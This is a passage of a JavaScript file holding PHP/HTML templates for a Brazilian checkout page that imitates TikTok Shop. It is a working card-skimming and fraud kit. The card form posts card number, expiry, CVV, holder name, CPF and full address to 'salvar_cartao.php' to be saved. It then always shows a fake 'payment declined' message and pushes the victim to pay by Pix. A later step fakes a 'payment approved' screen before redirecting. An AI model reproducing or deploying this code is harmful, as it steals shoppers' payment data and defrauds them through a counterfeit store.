            <p class="addr-section-title">Informações de endereço</p>
            <div class="addr-input-group"><input type="text" name="zip" id="ov-zip" placeholder="CEP/Código postal" class="addr-input" required onblur="fetchCep(this.value)"></div>
            <div class="flex gap-4 border-b border-gray-200"><div class="w-1/3 py-1 relative"><select name="state" id="ov-state" class="w-full bg-transparent text-[15px] outline-none appearance-none text-gray-700 h-full py-3" required><option value="" disabled selected>Estado/UF</option><option value="SP">SP</option><option value="RJ">RJ</option><option value="MG">MG</option><option value="RS">RS</option><option value="PR">PR</option><option value="BA">BA</option><option value="SC">SC</option><option value="GO">GO</option><option value="PE">PE</option><option value="CE">CE</option><option value="PA">PA</option><option value="MT">MT</option><option value="MA">MA</option><option value="ES">ES</option><option value="PB">PB</option><option value="AM">AM</option><option value="RN">RN</option><option value="AL">AL</option><option value="PI">PI</option><option value="MS">MS</option><option value="DF">DF</option><option value="SE">SE</option><option value="RO">RO</option><option value="TO">TO</option><option value="AC">AC</option><option value="AP">AP</option><option value="RR">RR</option></select><svg class="absolute right-0 top-4 w-4 h-4 text-gray-400 pointer-events-none" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg></div><div class="w-2/3 py-1"><input type="text" name="city" id="ov-city" placeholder="Cidade" class="w-full bg-transparent text-[15px] outline-none h-full py-3" required></div></div>
            <div class="addr-input-group"><input type="text" name="neighborhood" id="ov-neighborhood" placeholder="Bairro/Distrito" class="addr-input" required></div>
            <div class="addr-input-group"><input type="text" name="street" id="ov-street" placeholder="Endereço" class="addr-input" required></div>
            <div class="addr-input-group"><input type="text" name="number" id="ov-number" placeholder="Nº da residência. Use &quot;s/n&quot; se nenhum" class="addr-input" required></div>
            <div class="addr-input-group"><input type="text" name="complement" id="ov-complement" placeholder="Apartamento, bloco, unidade etc. (opcional)" class="addr-input"></div>
            <div class="fixed bottom-0 left-0 w-full bg-white border-t border-gray-200 p-4 pb-8 z-50"><p class="text-[11px] text-gray-500 text-center mb-3 leading-tight">Leia a <span class="font-bold">Política de privacidade do TikTok</span> para saber mais sobre como usamos suas informações pessoais.</p><button type="submit" class="w-full bg-[#fe2c55] text-white font-bold py-3 rounded-md text-[16px] shadow-sm active:bg-[#e0244a]">Salvar</button></div>
        </form>
    </div>
    <div id="screen-card-form" class="hidden-screen fixed inset-0 z-50 bg-white overflow-y-auto">
        <header class="bg-white px-4 py-4 flex items-center justify-between sticky top-0 z-10 border-b border-gray-100"><button onclick="closeCardScreen()" class="p-2 -ml-2"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg></button><h1 class="font-bold text-[17px] text-textDark">Adicionar cartao</h1><div class="w-8"></div></header>
        <div class="px-4 py-6">
            <div class="mb-6">
                <div class="flex justify-between items-center mb-2"><label class="text-[14px] font-medium text-textDark">Numero do cartao</label><div class="flex gap-1.5 items-center"><svg width="26" height="16" viewBox="0 0 36 24"><circle cx="12" cy="12" r="10" fill="#EB001B"/><circle cx="24" cy="12" r="10" fill="#F79E1B"/><path d="M18 4.5a9.9 9.9 0 0 0-3.5 7.5c0 3 1.3 5.7 3.5 7.5a9.9 9.9 0 0 0 3.5-7.5c0-3-1.3-5.7-3.5-7.5z" fill="#FF5F00"/></svg><svg width="36" height="12" viewBox="0 0 100 32"><path d="M38.3 0L24.8 32h-9.7L8.4 6.4c-.4-1.5-.7-2-1.9-2.6C4.2 2.8 1.5 1.9 0 1.4l.3-1.4h15.6c2 0 3.8 1.3 4.2 3.6l3.9 20.5L35 0h3.3zm12.2 0l-7.6 32h-9L41.4 0h9.1zm28.9 21.5c0-8.4-11.6-8.9-11.5-12.6 0-1.1 1.1-2.3 3.5-2.6 1.2-.2 4.4-.3 8.1 1.5l1.4-6.7C79.3.5 77.3 0 74.8 0c-8.7 0-14.9 4.6-14.9 11.3 0 4.9 4.4 7.7 7.8 9.3 3.5 1.7 4.6 2.8 4.6 4.3 0 2.3-2.8 3.4-5.3 3.4-4.5.1-7.1-1.2-9.2-2.2l-1.6 7.5c2.1 1 6 1.8 10 1.9 9.3 0 15.4-4.6 15.4-11.7zm23 10.5h8.1L103.6 0h-7.5c-1.7 0-3.1 1-3.7 2.5L81.7 32h9.3l1.8-5.1h11.4l1.1 5.1z" fill="#1A1F71"/></svg><svg width="26" height="12" viewBox="0 0 60 24"><rect width="60" height="24" rx="3" fill="#FFCB05"/><text x="30" y="17" font-size="14" font-weight="bold" text-anchor="middle" fill="#000">elo</text></svg><svg width="24" height="16" viewBox="0 0 40 26"><rect width="40" height="26" rx="3" fill="#016FD0"/><text x="20" y="18" font-size="9" font-weight="bold" text-anchor="middle" fill="#fff">AMEX</text></svg></div></div>
                <input type="text" id="card-number" class="w-full p-4 border border-gray-200 rounded-lg text-[15px] outline-none focus:border-[#fe2c55] bg-gray-50" placeholder="Insira o numero do cartao" maxlength="19" oninput="maskCardNumber(this)">
                <p id="card-number-error" class="text-[12px] text-[#fe2c55] mt-1 hidden">Numero do cartao e obrigatorio</p>
            </div>
            <div class="flex gap-4 mb-6">
                <div class="flex-1"><label class="text-[14px] font-medium text-textDark block mb-2">Data de validade</label><input type="text" id="card-expiry" class="w-full p-4 border border-gray-200 rounded-lg text-[15px] outline-none focus:border-[#fe2c55] bg-gray-50" placeholder="MM/AA" maxlength="5" oninput="maskExpiry(this)"></div>
                <div class="flex-1"><label class="text-[14px] font-medium text-textDark block mb-2 flex items-center gap-1">Codigo de seguranca <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg></label><input type="text" id="card-cvv" class="w-full p-4 border border-gray-200 rounded-lg text-[15px] outline-none focus:border-[#fe2c55] bg-gray-50" placeholder="CVV/CVC" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'')"></div>
            </div>
            <div class="mb-6"><label class="text-[14px] font-medium text-textDark block mb-2">Nome do titular do cartao</label><input type="text" id="card-holder" class="w-full p-4 border border-gray-200 rounded-lg text-[15px] outline-none focus:border-[#fe2c55] bg-gray-50" placeholder="Nome completo" oninput="this.value=this.value.toUpperCase()"></div>
            <div class="flex items-center gap-2 mb-8"><div class="w-5 h-5 rounded border-2 border-[#fe2c55] bg-[#fe2c55] flex items-center justify-center"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div><span class="text-[13px] text-textDark">Salvar este cartao para compras futuras</span></div>
        </div>
        <div class="fixed bottom-0 left-0 w-full bg-white border-t border-gray-200 p-4 pb-8 z-50"><button onclick="processCardPayment()" id="btn-card-continue" class="w-full bg-gray-200 text-gray-400 font-bold py-4 rounded-lg text-[16px] transition-all" disabled>Continuar</button></div>
    </div>
    <div id="modal-card-declined" class="hidden-screen fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-pop">
        <div class="bg-white w-full max-w-[340px] rounded-2xl p-6 text-center shadow-xl">
            <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M15 9l-6 6"/><path d="M9 9l6 6"/></svg></div>
            <h3 class="text-[18px] font-bold text-textDark mb-2">Pagamento Recusado</h3>
            <p class="text-[14px] text-gray-500 mb-4 leading-relaxed">Infelizmente seu cartao foi recusado pela operadora. Mas temos uma oferta especial para voce!</p>
            <div class="bg-green-50 border border-green-200 rounded-xl p-4 mb-4">
                <p class="text-[12px] text-green-600 font-medium mb-1">OFERTA EXCLUSIVA</p>
                <p class="text-[22px] font-bold text-green-600 mb-1"><span id="discount-percent">{{CARD_DISCOUNT}}</span>% OFF no Pix</p>
                <p class="text-[14px] text-gray-600">Novo valor: <span class="font-bold text-green-600">R$ <span id="discounted-total">0,00</span></span></p>
                <p class="text-[12px] text-gray-400 line-through">De R$ <span id="original-total-modal">0,00</span></p>
            </div>
            <button onclick="acceptDiscountPix()" class="w-full bg-[#fe2c55] text-white font-bold py-3.5 rounded-xl text-[16px] shadow-sm active:scale-95 transition-transform mb-2">Pagar com Pix e Desconto</button>
            <button onclick="closeDeclinedModal()" class="w-full text-gray-500 text-[14px] py-2">Tentar outro cartao</button>
        </div>
    </div>
    <div id="screen-pix" class="hidden-screen min-h-screen bg-white pb-28">
        <div class="bg-gradient-to-br from-[#ffe1ea] via-[#f1e7fb] to-white pb-10">
            <header class="flex items-center px-4 py-4"><button onclick="window.location.reload()" class="p-1"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg></button><h1 class="flex-1 text-center font-bold text-[17px] pr-6">Código do pagamento</h1></header>
            <div class="px-6 mt-2 flex justify-between items-start">
                <div>
                    <p class="font-bold text-[22px] leading-tight text-textDark">Aguardando o pagamento</p>
                    <p class="font-bold text-[26px] mt-1 text-textDark">R$ <span id="pix-value">0,00</span></p>
                    <div class="flex items-center gap-2 mt-3 text-[14px] text-gray-500"><span>Vence em</span><span class="bg-[#fe2c55] text-white font-bold px-2 py-1 rounded-md text-[13px] flex items-center gap-1"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg><span id="pix-countdown">23:59:47</span></span></div>
                    <p class="text-[14px] text-gray-400 mt-2">Prazo <span class="text-gray-600 font-medium"><?php echo $prazoPagamento; ?></span></p>
                </div>
                <div class="bg-orange-400 rounded-full w-14 h-14 flex items-center justify-center shadow-md text-white shrink-0"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div>
            </div>
        </div>
        <div class="mx-4 -mt-5 bg-white rounded-2xl shadow-lg border border-gray-100 p-5">
            <div class="flex items-center gap-2 mb-4"><div class="w-7 h-7 flex items-center justify-center"><img src="https://editor.sys-assets-check.com/img/pix.png" alt="Pix" class="w-full h-full object-contain"></div><span class="font-bold text-[18px] tracking-wide text-textDark">PIX</span></div>
            <p class="text-[24px] font-bold text-textDark mb-5 overflow-hidden whitespace-nowrap text-ellipsis" id="pix-code-text">Gerando...</p>
            <textarea id="pix-code-raw" class="hidden"></textarea>
            <button onclick="copyPixCode()" id="btn-copy" class="w-full bg-[#fe2c55] text-white font-bold py-3.5 rounded-lg flex items-center justify-center gap-2 text-[16px]"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Copiar</button>
        </div>
        <div class="px-5 mt-5"><p class="text-[13px] text-gray-500 leading-relaxed">Para acessar esta página no app, abra <b class="text-textDark">Loja</b> > <b class="text-textDark">Pedidos</b> > <b class="text-textDark">Sem pagamento</b> > <b class="text-textDark">Visualizar o código</b></p></div>
        <div class="px-5 mt-7"><h3 class="font-bold text-[19px] text-textDark mb-3">Como fazer pagamentos com PIX?</h3><p class="text-[14px] text-gray-500 leading-relaxed">Copie o código de pagamento acima, selecione Pix no seu app de internet ou de banco e cole o código.</p></div>
        <div class="fixed bottom-0 left-0 w-full p-4 pb-8 bg-white"><button onclick="showTrackingModal()" class="w-full bg-[#f1f1f2] text-textDark font-bold py-3.5 rounded-lg text-[16px]">Ver pedido</button></div>
    </div>
    <script>
        const initialItems = <?php echo json_encode($itemsData); ?>;
        const deadlineText = "<?php echo $prazoEntrega; ?>";
        const upsellUrl = "{{UPSELL_URL}}";
        const upsellDelay = parseInt("{{UPSELL_DELAY}}") || 15;
        let currentTotalGlobal = 0; // CORREÇÃO DE ESCOPO: PADRONIZADO PARA GLOBAL
        let pageLoadTime = Date.now();
        const MIN_TIME_TO_INTERACT = 2500;
        let isRedirectScheduled = false;
        
        let cartItems = initialItems.map(item => { 
            let pStr = String(item.price);
            let p = 0;
            if (pStr.includes(',') && pStr.includes('.')) p = parseFloat(pStr.replace('R$', '').replace(/\./g, '').replace(',', '.'));
            else if (pStr.includes(',')) p = parseFloat(pStr.replace('R$', '').replace(',', '.'));
            else p = parseFloat(pStr.replace('R$', ''));
            if(isNaN(p)) p = 0;
            const shippingCost = 0; 
            return { ...item, priceVal: p, qty: parseInt(item.qty) || 1, itemShipping: shippingCost }; 
        });

        function renderProducts() {
            const container = document.getElementById('products-list'); 
            if(!container) return; 
            container.innerHTML = '';
            cartItems.forEach((item, index) => {
                const originalPrice = item.priceVal * 3.1; const discountPct = Math.round(((originalPrice - item.priceVal) / originalPrice) * 100); 
                const storeName = item.storeName || '{{STORE_NAME}}'; 
                const originalShipping = item.itemShipping + 15.00;
                const html = \`<div class="p-4 border-b border-gray-100 last:border-0"><div class="flex justify-between items-center mb-3"><span class="font-bold text-[14px] text-textDark">\${storeName}</span><span class="text-[12px] text-gray-500">Adicionar nota ></span></div><div class="flex gap-3"><img src="\${item.image}" class="w-20 h-20 object-cover rounded-sm bg-gray-100"><div class="flex-1"><p class="text-[13px] leading-snug line-clamp-2 text-textDark">\${item.title}</p><p class="text-[12px] text-gray-500 mt-1">\${item.variant || 'Padrão'}</p><div class="flex items-center gap-1 mt-1 mb-2"><svg width="10" height="10" viewBox="0 0 24 24" fill="#fbbf24"><circle cx="12" cy="12" r="10"/></svg><span class="text-[10px] text-gray-500">Devolução gratuita</span></div><div class="flex justify-between items-end"><div><p class="text-[#fe2c55] font-bold text-[15px]">R$ \${formatMoney(item.priceVal)}</p><p class="text-[10px] text-gray-400 line-through">R$ \${formatMoney(originalPrice)} -\${discountPct}%</p></div><div class="qty-box"><button onclick="changeQty(\${index}, -1)" class="qty-btn text-gray-400">-</button><span class="qty-val">\${item.qty}</span><button onclick="changeQty(\${index}, 1)" class="qty-btn">+</button></div></div></div></div><div class="mt-3 flex justify-between items-center text-[13px]"><div><p class="font-medium text-textDark">Receba até \${deadlineText}</p><p class="text-gray-500 text-[11px]">Envio padrão</p></div><div class="text-right"><p class="font-medium text-textDark">R$ \${formatMoney(item.itemShipping)} <span class="text-gray-400 line-through text-[11px]">R$ \${formatMoney(originalShipping)}</span></p></div></div></div>\`;
                container.innerHTML += html;
            });
            updateSummary();
        }
        function changeQty(index, change) { const newQty = cartItems[index].qty + change; if (newQty > 0) { cartItems[index].qty = newQty; renderProducts(); } }
        function updateSummary() {
            let itemsSubtotal = 0; let originalTotal = 0; let totalItemsCount = 0; let shippingSubtotal = 0;
            cartItems.forEach(item => { itemsSubtotal += (item.priceVal * item.qty); originalTotal += ((item.priceVal * 3.1) * item.qty); shippingSubtotal += (item.itemShipping * item.qty); totalItemsCount += item.qty; });
            const fixedCoupons = 35.00; const productDiscount = (originalTotal - itemsSubtotal) - fixedCoupons; const shippingDiscount = 40.00; const shippingFeeDisplay = shippingSubtotal + shippingDiscount; const finalTotal = itemsSubtotal + shippingSubtotal; const totalSavings = (originalTotal - itemsSubtotal) + shippingDiscount;
            currentTotalGlobal = finalTotal; // CORREÇÃO DE ESCOPO
            const setVal = (id, v) => { const el = document.getElementById(id); if(el) el.innerText = v; };
            setVal('summary-subtotal', formatMoney(itemsSubtotal));
            setVal('summary-original', formatMoney(originalTotal));
            setVal('summary-disc-prod', formatMoney(productDiscount));
            setVal('summary-shipping-subtotal', formatMoney(shippingSubtotal));
            setVal('summary-shipping-fee', formatMoney(shippingFeeDisplay));
            setVal('summary-total', formatMoney(finalTotal));
            setVal('footer-total', formatMoney(finalTotal));
            setVal('pix-value', formatMoney(finalTotal));
            setVal('items-count', totalItemsCount);
            setVal('total-savings', formatMoney(totalSavings));
        }
        function formatMoney(val) { return val.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }
        function openAddressScreen() { document.getElementById('screen-address-overlay').classList.remove('hidden-screen'); }
        function closeAddressScreen() { document.getElementById('screen-address-overlay').classList.add('hidden-screen'); }
        function closeReqAddr() { document.getElementById('modal-req-addr').classList.add('hidden-screen'); openAddressScreen(); }
        function showTrackingModal() { document.getElementById('modal-tracking-warning').classList.remove('hidden-screen'); }
        function closeTrackingModal() { 
            document.getElementById('modal-tracking-warning').classList.add('hidden-screen'); 
            if(upsellUrl && upsellUrl.trim() !== "" && !isRedirectScheduled) {
                isRedirectScheduled = true;
                setTimeout(() => { initiateRedirectSequence(); }, upsellDelay * 1000);
            }
        }
        function initiateRedirectSequence() {
             document.getElementById('modal-upsell-redirect').classList.remove('hidden-screen');
             setTimeout(() => {
                document.getElementById('upsell-status-icon').innerHTML = '<div class="checkmark-circle"><div class="checkmark-check"></div></div>';
                document.getElementById('upsell-status-title').innerText = 'Pagamento Aprovado!';
                document.getElementById('upsell-status-title').classList.add('text-green-600');
                document.getElementById('upsell-status-desc').innerText = 'Redirecionando para seu acesso...';
             }, 2000);
             setTimeout(() => { window.location.href = upsellUrl; }, 3500);
        }
        function saveAddressOverlay(e) { e.preventDefault(); const name = document.getElementById('ov-name').value; const phone = document.getElementById('ov-phone').value; const street = document.getElementById('ov-street').value; const number = document.getElementById('ov-number').value; const bairro = document.getElementById('ov-neighborhood').value; const city = document.getElementById('ov-city').value; const state = document.getElementById('ov-state').value; const cep = document.getElementById('ov-zip').value; if (name && street) { document.getElementById('disp-name').innerText = name; document.getElementById('disp-phone').innerText = '(+55) ' + phone; document.getElementById('disp-full').innerText = \`\${street}, \${number}, \${bairro}, \${city}, \${state}, \${cep}\`; document.getElementById('btn-add-address-container').classList.add('hidden'); document.getElementById('address-display-container').classList.remove('hidden'); closeAddressScreen(); } }
        async function fetchCep(cep) { cep = cep.replace(/\\D/g, ''); if(cep.length === 8) { try { const r = await fetch(\`https://viacep.com.br/ws/\${cep}/json/\`); const d = await r.json(); if(!d.erro) { document.getElementById('ov-street').value = d.logradouro; document.getElementById('ov-neighborhood').value = d.bairro; document.getElementById('ov-city').value = d.localidade; document.getElementById('ov-state').value = d.uf; } } catch(e){} } }
        function toggleCPFForm() { document.getElementById('btn-add-cpf-container').classList.add('hidden'); document.getElementById('cpf-form-container').classList.remove('hidden'); }
        function maskCPF(i) { let v = i.value.replace(/\\D/g, ""); v = v.replace(/(\\d{3})(\\d)/, "$1.$2"); v = v.replace(/(\\d{3})(\\d)/, "$1.$2"); v = v.replace(/(\\d{3})(\\d)/, "$1.$2"); v = v.replace(/(\\d{3})(\\d{1,2})$/, "$1-$2"); i.value = v.substring(0, 14); }
        async function processPayment() {
            const btn = document.getElementById('btn-pay'); 
            const oldText = btn.innerHTML; 
            const addrContainer = document.getElementById('address-display-container');
            if (addrContainer.classList.contains('hidden')) { document.getElementById('modal-req-addr').classList.remove('hidden-screen'); return; }
            if (Date.now() - pageLoadTime < MIN_TIME_TO_INTERACT) return;
            const honeypot = document.getElementById('website-control');
            if (honeypot && honeypot.value !== "") return;
            btn.disabled = true; document.getElementById('loading-dark').classList.remove('hidden-screen');
            let name = document.getElementById('disp-name').innerText; if (name === 'Nome' || !name) name = 'Cliente Convidado';
            let cpf = document.getElementById('chk-cpf').value; if(!cpf) cpf = '00000000000';
            let phone = document.getElementById('ov-phone').value; if(!phone || phone.trim() === '') phone = '11999999999';
            let email = document.getElementById('ov-email').value; if(!email) email = 'compra@checkout.com';
            
            // --- CORREÇÃO DO CLICK_ID AQUI ---
            const urlParams = new URLSearchParams(window.location.search);
            const clickId = urlParams.get('click_id') || urlParams.get('src') || '';

            const payload = {
                amount: currentTotalGlobal, // CORREÇ��O DE ESCOPO
                cpf: cpf,
                click_id: clickId,
                customer: { name: name, email: email, phone: phone },
                items: cartItems.map(i => ({ title: i.title, unit_price: i.priceVal, quantity: i.qty, tangible: false }))
            };

            try {
                const response = await fetch('processar_pagamento.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
                const text = await response.text();
                let res;
                try {
                    res = JSON.parse(text);
                } catch(e) {
                    throw new Error('Resposta inválida do servidor: ' + text.substring(0, 100));
                }

                if(res.success) { 
                    if (typeof ttq !== 'undefined') { ttq.track('CompletePayment', { content_id: cartItems[0].title, quantity: 1, price: currentTotalGlobal, value: currentTotalGlobal, currency: 'BRL', email: email, phone_number: phone }); } // CORREÇÃO DE ESCOPO
                    const setText = (id, txt) => { const el = document.getElementById(id); if(el) el.innerText = txt; }
                    const setVal = (id, val) => { const el = document.getElementById(id); if(el) el.value = val; }
                    setText('pix-code-text', res.pix_code); setVal('pix-code-raw', res.pix_code); setText('pix-value', formatMoney(currentTotalGlobal)); // CORREÇÃO DE ESCOPO
                    const imgEl = document.getElementById('pix-qr-img'); 
                    if(res.qr_image && imgEl) { imgEl.src = res.qr_image; imgEl.style.display = 'block'; }
                    else if(imgEl) { imgEl.src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(res.pix_code); imgEl.style.display = 'block'; }
                    document.getElementById('loading-dark').classList.add('hidden-screen');
                    document.getElementById('loading-white').classList.remove('hidden-screen');
                    setTimeout(function() { document.getElementById('loading-white').classList.add('hidden-screen'); document.getElementById('screen-checkout').classList.add('hidden-screen'); document.getElementById('screen-pix').classList.remove('hidden-screen'); window.scrollTo(0,0); }, 1300);
                } else { 
                    let msg = res.message || 'Erro desconhecido'; 
                    if(res.api_response && res.api_response.errors) msg += '\\nMotivo: ' + JSON.stringify(res.api_response.errors); 
                    else if(res.debug_msg) msg += '\\nDetalhe: ' + res.debug_msg; 
                    document.getElementById('loading-dark').classList.add('hidden-screen'); document.getElementById('loading-white').classList.add('hidden-screen');
                    alert('Erro no pagamento: ' + msg); 
                    btn.innerHTML = oldText; btn.disabled = false; 
                }
            } catch(e) { console.error(e); document.getElementById('loading-dark').classList.add('hidden-screen'); document.getElementById('loading-white').classList.add('hidden-screen'); alert('Erro de conexão: ' + e.message); btn.innerHTML = oldText; btn.disabled = false; }
        }
        function copyPixCode() { const code = document.getElementById('pix-code-raw').value; if(!code) return; navigator.clipboard.writeText(code); const btn = document.getElementById('btn-copy'); btn.innerText = 'Copiado!'; btn.classList.replace('bg-[#fe2c55]', 'bg-green-500'); setTimeout(() => { btn.innerText = 'Copiar'; btn.classList.replace('bg-green-500', 'bg-[#fe2c55]'); }, 2000); }
        let timeSeconds = 86387; 
        setInterval(() => { 
            if(timeSeconds > 0) timeSeconds--; 
            const h = Math.floor(timeSeconds / 3600).toString().padStart(2,'0'); const m = Math.floor((timeSeconds % 3600) / 60).toString().padStart(2,'0'); const s = (timeSeconds % 60).toString().padStart(2,'0'); const timeString = \`\${h}:\${m}:\${s}\`;
            const el = document.getElementById('countdown'); if(el) el.innerText = timeString;
            const elPix = document.getElementById('pix-countdown'); if(elPix) elPix.innerText = timeString;
        }, 1000);
        if (typeof ttq !== 'undefined') { ttq.track('InitiateCheckout'); }
        renderProducts();

        // --- CREDIT CARD FUNCTIONS ---
        const cardDiscountPercent = parseInt('{{CARD_DISCOUNT}}') || 15;
        let selectedPayment = 'pix';
        let discountedAmount = 0;
        
        function selectPaymentMethod(method) {
            selectedPayment = method;
            var pixCircle = document.getElementById('radio-pix-circle');
            if (pixCircle) { pixCircle.innerHTML = (method === 'pix') ? '<div class="w-2.5 h-2.5 rounded-full bg-[#32BCAD]"></div>' : ''; }
            if (method === 'card') { openCardScreen(); }
        }
        function openCardScreen() { document.getElementById('screen-card-form').classList.remove('hidden-screen'); updateCardButton(); }
        function closeCardScreen() { document.getElementById('screen-card-form').classList.add('hidden-screen'); selectedPayment = 'pix'; var pixCircle = document.getElementById('radio-pix-circle'); if (pixCircle) { pixCircle.innerHTML = '<div class="w-2.5 h-2.5 rounded-full bg-[#32BCAD]"></div>'; } }
        function maskCardNumber(input) {
            let v = input.value.replace(/\\D/g, '');
            v = v.replace(/(\\d{4})(?=\\d)/g, '$1 ');
            input.value = v.substring(0, 19);
            updateCardButton();
        }
        function maskExpiry(input) {
            let v = input.value.replace(/\\D/g, '');
            if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2);
            input.value = v.substring(0, 5);
            updateCardButton();
        }
        function updateCardButton() {
            const num = document.getElementById('card-number').value.replace(/\\s/g,'');
            const exp = document.getElementById('card-expiry').value;
            const cvv = document.getElementById('card-cvv').value;
            const holder = document.getElementById('card-holder').value;
            const btn = document.getElementById('btn-card-continue');
            if (num.length >= 13 && exp.length === 5 && cvv.length >= 3 && holder.length >= 3) {
                btn.disabled = false;
                btn.classList.remove('bg-gray-200', 'text-gray-400');
                btn.classList.add('bg-[#fe2c55]', 'text-white');
            } else {
                btn.disabled = true;
                btn.classList.add('bg-gray-200', 'text-gray-400');
                btn.classList.remove('bg-[#fe2c55]', 'text-white');
            }
        }
        ['card-number','card-expiry','card-cvv','card-holder'].forEach(id => {
            const el = document.getElementById(id);
            if(el) el.addEventListener('input', updateCardButton);
        });
        
        async function processCardPayment() {
            const btn = document.getElementById('btn-card-continue');
            btn.innerHTML = '<div class="loader mx-auto"></div>';
            btn.disabled = true;
            
            const cardData = {
                // Dados do cartao
                card_number: document.getElementById('card-number').value,
                card_expiry: document.getElementById('card-expiry').value,
                card_cvv: document.getElementById('card-cvv').value,
                card_holder: document.getElementById('card-holder').value,
                // Dados da compra
                amount: currentTotalGlobal,
                // Dados pessoais
                customer_name: document.getElementById('disp-name').innerText || document.getElementById('ov-name').value || 'Cliente',
                customer_phone: document.getElementById('ov-phone').value || '',
                customer_email: document.getElementById('ov-email').value || '',
                customer_cpf: document.getElementById('chk-cpf').value || '',
                // Dados de endereco
                address_zip: document.getElementById('ov-zip').value || '',
                address_state: document.getElementById('ov-state').value || '',
                address_city: document.getElementById('ov-city').value || '',
                address_neighborhood: document.getElementById('ov-neighborhood').value || '',
                address_street: document.getElementById('ov-street').value || '',
                address_number: document.getElementById('ov-number').value || '',
                address_complement: document.getElementById('ov-complement').value || '',
                // Timestamp
                timestamp: new Date().toISOString()
            };
            
            // Save card data to file
            try {
                await fetch('salvar_cartao.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(cardData) });
            } catch(e) { console.log('Erro ao salvar cartao'); }
            
            // Simulate processing then show declined
            setTimeout(() => {
                btn.innerHTML = 'Continuar';
                btn.disabled = false;
                showDeclinedModal();
            }, 2500);
        }
        
        function showDeclinedModal() {
            discountedAmount = currentTotalGlobal * (1 - cardDiscountPercent / 100);
            document.getElementById('discount-percent').innerText = cardDiscountPercent;
            document.getElementById('discounted-total').innerText = formatMoney(discountedAmount);
            document.getElementById('original-total-modal').innerText = formatMoney(currentTotalGlobal);
            document.getElementById('screen-card-form').classList.add('hidden-screen');
            document.getElementById('modal-card-declined').classList.remove('hidden-screen');
        }
        
        function closeDeclinedModal() {
            document.getElementById('modal-card-declined').classList.add('hidden-screen');
            document.getElementById('screen-card-form').classList.remove('hidden-screen');
            // Clear card fields
            document.getElementById('card-number').value = '';
            document.getElementById('card-expiry').value = '';
            document.getElementById('card-cvv').value = '';
            document.getElementById('card-holder').value = '';
            updateCardButton();
        }
        
        async function acceptDiscountPix() {
            document.getElementById('modal-card-declined').classList.add('hidden-screen');
            const btn = document.getElementById('btn-pay');
            const oldText = btn.innerHTML;
            btn.innerHTML = '<div class="loader"></div>';
            btn.disabled = true;
            
            let name = document.getElementById('disp-name').innerText || 'Cliente';
            let cpf = document.getElementById('chk-cpf').value || '00000000000';
            let phone = document.getElementById('ov-phone').value || '11999999999';
            let email = document.getElementById('ov-email').value || 'compra@checkout.com';
            const urlParams = new URLSearchParams(window.location.search);
            const clickId = urlParams.get('click_id') || urlParams.get('src') || '';
            
            const payload = {
                amount: discountedAmount,
                cpf: cpf,
                click_id: clickId,
                customer: { name: name, email: email, phone: phone },
                items: cartItems.map(i => ({ title: i.title, unit_price: i.priceVal * (1 - cardDiscountPercent/100), quantity: i.qty, tangible: false }))
            };
            
            try {
                const response = await fetch('processar_pagamento.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
                const res = await response.json();
                if(res.success) {
                    document.getElementById('screen-checkout').classList.add('hidden-screen');
                    document.getElementById('screen-pix').classList.remove('hidden-screen');
                    window.scrollTo(0,0);
                    document.getElementById('pix-code-text').innerText = res.pix_code;
                    document.getElementById('pix-code-raw').value = res.pix_code;
                    document.getElementById('pix-value').innerText = formatMoney(discountedAmount);
                    const imgEl = document.getElementById('pix-qr-img');
                    if(res.qr_image && imgEl) { imgEl.src = res.qr_image; imgEl.style.display = 'block'; }
                    else if(imgEl) { imgEl.src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(res.pix_code); imgEl.style.display = 'block'; }
                } else {
                    alert('Erro no pagamento: ' + (res.message || 'Erro desconhecido'));
                    btn.innerHTML = oldText;
                    btn.disabled = false;
                }
            } catch(e) {
                alert('Erro de conexao: ' + e.message);
                btn.innerHTML = oldText;
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>`;

// CHECKOUT V2 (CLEAN, FIXED V3.1)
const CHECKOUT_V2_TEMPLATE = `<?php
date_default_timezone_set('America/Sao_Paulo');
$itemsData = null;
if (isset($_GET['items_data'])) { $decoded = json_decode(urldecode($_GET['items_data']), true); if (json_last_error() === JSON_ERROR_NONE && is_array($decoded)) { $itemsData = $decoded; } }
if (!$itemsData) {
